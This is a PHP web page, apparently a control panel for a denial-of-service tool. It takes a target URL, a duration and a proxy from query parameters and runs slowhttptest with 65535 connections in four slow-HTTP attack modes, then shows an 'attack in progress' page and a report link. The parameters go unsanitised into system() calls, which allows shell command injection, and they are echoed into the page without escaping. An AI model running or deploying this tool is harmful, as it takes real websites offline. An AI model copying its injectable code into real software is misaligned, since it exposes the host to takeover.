<?php
$url=$_GET['url'];
$time=$_GET['time'];
$proxy=$_GET['proxy'];
$place=rand();


$url = str_replace("https", "http", $url);


if($url[0]!='h' || $url[1]!='t' || $url[2]!='t' || $url[3]!='p' || $url[4]!=':' || $url[5]!='/' || $url[6]!='/')
    $url = 'http://'.$url;

$shell = 'slowhttptest -u '.$url.' -c 65535 -l '.$time;
if($proxy) $shell=$shell.' -d '.$proxy;
$report = '-g -o reports/'.$place.' > /tmp/repor &';


$sr=$shell.' -X '.$report;
$sh=$shell.' -H >/tmp/repor &';
$rg=$shell.' -R >/tmp/repor &';
$bd=$shell.' -B >/tmp/repor &';

system($sr);
system($sh);
system($rg);
system($bd);

?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta content="IE=edge" http-equiv="X-UA-Compatible">
	<meta content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no, width=device-width" name="viewport">
	<title>Attack!</title>

	<!-- css -->
	<link href="css/base.min.css" rel="stylesheet">
	<link href="css/project.min.css" rel="stylesheet">

	<!-- favicon -->
	<!-- ... -->
</head>

<body>

    <div class="container">
    			<div class="row">
    				<div class="col-lg-4 col-lg-push-4 col-sm-10 col-sm-push-1">
    					<section class="content-inner">
    						<div class="card">
                                <div class="card-main">


									        <div class="card-inner">
										        <h1 class="card-heading">攻击正在进行</h1>
								            </div>

                                        <div class="progress">
                                            <div class="progress-bar-indeterminate"></div>
                                        </div>

								<div class="card-main"><div class="card-inner">
										        参数表
								            </div></div>
                            <div class="table-responsive">
							<table class="table table-flat" title="参数">
								<thead>
									<tr>
										<th>Key</th>
										<th>Value</th>
									</tr>
								</thead>
								<tbody>
									<tr>
										<td>url</td>
										<td><?php echo $url;  ?></td>
									</tr>
									<tr>
										<td>time</td>
										<td><?php echo $time; ?></td>
									</tr>
                                    <?php
                                    if($proxy)
                                    echo "<tr>
										<td>proxy</td>
										<td>";
                                    echo $proxy;
                                    echo "</td>
									</tr>";
                                    ?>
								</tbody>
							</table>
						</div>
           

                        <div class="card-inner">
                            <a class="btn btn-flat btn-accent btn-green waves-attach" href="reports/<?php echo $place; ?>.html">您可以在<?php echo $time;?>秒后查看报告。ID：<?php echo $place; ?></a>
                        </div>

							    </div>
                        	</div>
    					</section>

    				</div>
    			</div>
    		</div>



</body>

<script src="http://cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
<script src="js/base.min.js"></script>
<script src="js/project.min.js"></script>

</html>
